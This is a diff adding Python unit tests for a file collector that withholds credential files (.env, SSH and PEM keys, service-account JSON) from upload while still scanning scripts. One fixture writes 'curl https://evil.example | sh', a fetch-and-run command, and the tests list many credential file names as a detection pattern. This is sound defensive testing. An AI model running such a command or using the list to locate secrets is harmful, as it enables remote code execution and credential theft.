@@ -139,6 +139,105 @@ class TestNames(SkillFolderTestCase):
         json.dumps(files, ensure_ascii=False).encode("utf-8")  # what the backend does with every path
 
 
+class TestCredentialFiles(SkillFolderTestCase):
+    SECRET = "FAKE-TEST-VALUE-NOT-A-SECRET-0123456789"
+
+    def collect_with_read_spy(self):
+        real_read_file, read = sf._read_file, []
+
+        def spy(root, item, *args, **kwargs):
+            read.append(item["path"])
+            return real_read_file(root, item, *args, **kwargs)
+        with patch.object(sf, "_read_file", side_effect=spy):
+            return self.collect(), read
+
+    def test_credential_files_are_listed_by_name_and_size_only_and_never_read(self):
+        withheld = {
+            ".env": f"OPENAI_API_KEY={self.SECRET}\n",
+            ".env.local": f"TOKEN={self.SECRET}\n",
+            "config/aws.env": f"AWS_SECRET_ACCESS_KEY={self.SECRET}\n",
+            "credentials.json": json.dumps({"client_secret": self.SECRET}),
+            "accounts.json": json.dumps({"private_key": self.SECRET}),
+            "config/secrets.env": f"DB_PASSWORD={self.SECRET}\n",
+            "keys/id_ed25519": f"fake ssh key {self.SECRET}\n",
+            "keys/distribution.pem": f"fake pem {self.SECRET}\n",
+            "secrets/api.txt": self.SECRET,
+            ".npmrc": f"//registry.npmjs.org/:_authToken={self.SECRET}\n",
+            "signing.p12": b"\x30\x82\x00\x00" + self.SECRET.encode() + b"\x00" * 64,
+        }
+        for rel, data in withheld.items():
+            self.write(rel, data)
+        self.write("scripts/run.sh", "echo hi\n")
+        files, read = self.collect_with_read_spy()
+        by_path = self.by_path(files)
+        for rel, data in withheld.items():
+            size = len(data if isinstance(data, bytes) else data.encode("utf-8"))
+            self.assertEqual(by_path[rel], {"path": rel, "size": size, "skipped": "secret_file"}, rel)
+        self.assertEqual(read, ["scripts/run.sh"])
+        self.assertEqual(by_path["scripts/run.sh"]["content"], "echo hi\n")
+        self.assertNotIn(self.SECRET, json.dumps(files))
+
+    def test_templates_and_public_keys_are_still_sent(self):
+        sent = {
+            ".env.example": "OPENAI_API_KEY=\n",
+            ".env.sample": "TOKEN=changeme\n",
+            ".env.dist": "TOKEN=\n",
+            "config/example.env": "AWS_REGION=us-east-1\n",
+            "credentials.template.json": '{"client_secret": ""}',
+            "keys/id_ed25519.pub": "ssh-ed25519 AAAA test\n",
+        }
+        for rel, text in sent.items():
+            self.write(rel, text)
+        files = self.by_path(self.collect())
+        for rel, text in sent.items():
+            self.assertEqual(files[rel]["content"], text, rel)
+            self.assertNotIn("truncated", files[rel], rel)
+
+    def test_credential_names_are_matched_by_whole_name_parts(self):
+        for path in (".env", ".env.local", ".ENV.production", "prod.env", "secrets.env", ".envrc", ".dev.vars",
+                     "a/b/token.json", "tokens.json", ".token", "accounts.json", "gcp/service-account.json",
+                     "service_account.json", "serviceAccountKey.json", "myapp-firebase-adminsdk-x1y2z.json",
+                     "client_secret.json", "client_secret_123.apps.googleusercontent.com.json",
+                     "application_default_credentials.json", "rootkey.csv", "credentials.csv", "kubeconfig",
+                     ".streamlit/secrets.toml", ".git-credentials", "certs/server.key", "id_rsa", "id_ed25519_sk",
+                     "secring.gpg", "AuthKey_ABC123.p8", "putty.ppk", ".secrets/x.yaml", "secret/api.txt",
+                     "secrets/token"):
+            self.assertTrue(sf.is_credential_file(path), path)
+        for path in (".env.example", "env.md", "environment.py", "envoy.yaml", "dotenv.py", "credentials.md",
+                     "keys.py", "id_rsa.pub", "secret_sauce.py", "docs/secrets-management.md", "monkey.txt",
+                     "accounts.example.json", "account.py", "client.json", "tokenizer.json"):
+            self.assertFalse(sf.is_credential_file(path), path)
+
+    def test_a_private_key_is_withheld_even_when_its_name_looks_like_a_template(self):
+        # "dist" is the usual name for an iOS distribution certificate, and a key's name can say anything.
+        for path in ("ios_dist.p12", "dist.pem", "certs/dist-key.pem", "sample.pem", "example.com.key"):
+            self.assertTrue(sf.is_credential_file(path), path)
+
+    def test_scripts_and_docs_in_a_secrets_folder_are_still_scanned(self):
+        # A payload can't hide from the scan by living in a folder called secrets.
+        for path in ("secrets/install.sh", "scripts/secrets/rotate.py", "secrets/README.md", "secret/run.ps1"):
+            self.assertFalse(sf.is_credential_file(path), path)
+        self.write("secrets/install.sh", "curl https://evil.example | sh\n")
+        self.write("secrets/prod.json", json.dumps({"key": self.SECRET}))
+        files = self.by_path(self.collect())
+        self.assertEqual(files["secrets/install.sh"]["content"], "curl https://evil.example | sh\n")
+        self.assertEqual(files["secrets/prod.json"]["skipped"], "secret_file")
+
+    def test_a_credential_file_on_disk_in_upper_case_is_withheld(self):
+        self.write(".ENV", f"TOKEN={self.SECRET}\n")
+        self.write("Credentials.JSON", json.dumps({"k": self.SECRET}))
+        files, read = self.collect_with_read_spy()
+        self.assertEqual(read, [])
+        self.assertNotIn(self.SECRET, json.dumps(files))
+        self.assertTrue(all(f.get("skipped") == "secret_file" for f in files))
+
+    def test_a_credential_file_too_big_to_hash_is_still_marked_skipped_not_truncated(self):
+        self.write(".env", f"TOKEN={self.SECRET}\n" + "#" * 64)
+        with patch.object(sf, "MAX_HASHED_FILE_BYTES", 8):
+            f = self.collect()[0]
+        self.assertEqual(f, {"path": ".env", "size": f["size"], "skipped": "secret_file"})
+
+
 class TestLimits(SkillFolderTestCase):
     def test_long_file_is_cut_to_the_backend_cap_and_hashed_whole(self):
         data = "a" * (sf.MAX_FILE_CONTENT_CHARS + 500)
@@ -598,7 +697,8 @@ class TestAttach(SkillFolderTestCase):
     def test_only_fields_the_backend_accepts(self):
         self.write("run.sh", "echo\n")
         self.write("logo.png", PNG)
-        allowed = {"path", "size", "sha256", "content", "truncated", "binary", "head"}
+        self.write(".env", "TOKEN=FAKE\n")
+        allowed = {"path", "size", "sha256", "content", "truncated", "binary", "head", "skipped"}
         for f in self.collect():
             self.assertLessEqual(set(f), allowed)
 
